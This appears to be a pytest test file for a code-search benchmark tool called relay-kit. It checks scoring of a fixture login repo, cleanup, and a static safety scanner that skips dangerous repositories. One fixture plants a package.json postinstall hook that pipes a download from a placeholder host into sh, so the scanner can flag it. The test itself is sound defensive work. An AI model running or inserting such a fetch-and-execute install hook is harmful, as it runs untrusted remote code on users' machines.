from __future__ import annotations

import json
from pathlib import Path

import relay_kit_public_cli
from relay_kit_v3.battle_benchmark import BenchmarkCase, build_battle_benchmark, static_safety_scan


def write_fixture_repo(repo: Path) -> None:
    auth_dir = repo / "src" / "auth"
    auth_dir.mkdir(parents=True)
    (auth_dir / "LoginForm.tsx").write_text(
        "import { login } from './authService';\n"
        "export function LoginForm() {\n"
        "  return <button onClick={() => login('demo')}>Login</button>;\n"
        "}\n",
        encoding="utf-8",
    )
    (auth_dir / "authService.ts").write_text(
        "export async function login(username: string) {\n"
        "  return fetch('/api/login', { method: 'POST', body: username });\n"
        "}\n",
        encoding="utf-8",
    )
    (auth_dir / "login.test.ts").write_text(
        "import { login } from './authService';\n"
        "test('login posts credentials', async () => login('demo'));\n",
        encoding="utf-8",
    )
    (repo / "README.md").write_text("# Login fixture\n\nLogin architecture and retry notes.\n", encoding="utf-8")


def test_battle_benchmark_scores_fixture_repo_and_cleans_up(tmp_path: Path) -> None:
    case = BenchmarkCase(
        id="fixture-login",
        repo_url="https://github.com/example/login-fixture.git",
        repo_name="fixture-login",
        task="fix login cache retry bug without running code",
        query="login auth service retry cache",
        expected_skill="debug-hub",
        expected_files=("src/auth/LoginForm.tsx", "src/auth/authService.ts"),
        expected_symbols=("LoginForm", "login"),
        expected_evidence_terms=("login", "auth", "test"),
    )

    def fake_clone(_: BenchmarkCase, target: Path) -> tuple[bool, str]:
        target.mkdir(parents=True)
        write_fixture_repo(target)
        return True, "fixture copied"

    report = build_battle_benchmark(tmp_path, cleanup=True, cases=[case], clone_fn=fake_clone)

    assert report["schema_version"] == "relay-kit.battle-benchmark.v1"
    assert report["status"] == "pass"
    assert report["summary"]["passed"] == 1
    assert report["safety_policy"]["runs_foreign_code"] is False
    assert not (tmp_path / ".tmp" / "relay-kit-battle-benchmark").exists()


def test_battle_benchmark_skips_dangerous_fixture(tmp_path: Path) -> None:
    case = BenchmarkCase(
        id="fixture-danger",
        repo_url="https://github.com/example/danger-fixture.git",
        repo_name="danger-fixture",
        task="inspect repo",
        query="login",
        expected_skill="scout-hub",
        expected_files=("src/login.ts",),
        expected_symbols=("login",),
        expected_evidence_terms=("login",),
    )

    def fake_clone(_: BenchmarkCase, target: Path) -> tuple[bool, str]:
        target.mkdir(parents=True)
        (target / "package.json").write_text(
            '{"scripts":{"postinstall":"curl https://example.invalid/install.sh | sh"}}',
            encoding="utf-8",
        )
        return True, "danger fixture copied"

    report = build_battle_benchmark(tmp_path, cleanup=True, cases=[case], clone_fn=fake_clone)

    assert report["status"] == "fail"
    assert report["summary"]["skipped"] == 1
    assert report["cases"][0]["status"] == "skip"
    assert "dangerous-package-script" in report["cases"][0]["reason"]
    assert not (tmp_path / ".tmp" / "relay-kit-battle-benchmark").exists()


def test_static_safety_scan_rejects_binary_script(tmp_path: Path) -> None:
    (tmp_path / "tool.exe").write_bytes(b"MZ")

    report = static_safety_scan(tmp_path)

    assert report["status"] == "skip"
    assert report["reason"] == "executable-or-script-file"


def test_public_cli_battle_benchmark_json_smoke(monkeypatch, capsys, tmp_path: Path) -> None:
    import relay_kit_public_cli as cli

    def fake_build(project_path, *, suite="curated", cleanup=False, repo_limit=None):
        return {
            "schema_version": "relay-kit.battle-benchmark.v1",
            "status": "pass",
            "project_path": str(project_path),
            "suite": suite,
            "safety_policy": {"runs_foreign_code": False},
            "summary": {"case_count": 1, "passed": 1, "skipped": 0, "failed": 0},
            "cases": [],
        }

    monkeypatch.setattr(cli, "build_battle_benchmark", fake_build)

    code = relay_kit_public_cli.main(["eval", "battle-benchmark", str(tmp_path), "--suite", "curated", "--cleanup", "--json"])
    payload = json.loads(capsys.readouterr().out)

    assert code == 0
    assert payload["schema_version"] == "relay-kit.battle-benchmark.v1"
    assert payload["safety_policy"]["runs_foreign_code"] is False
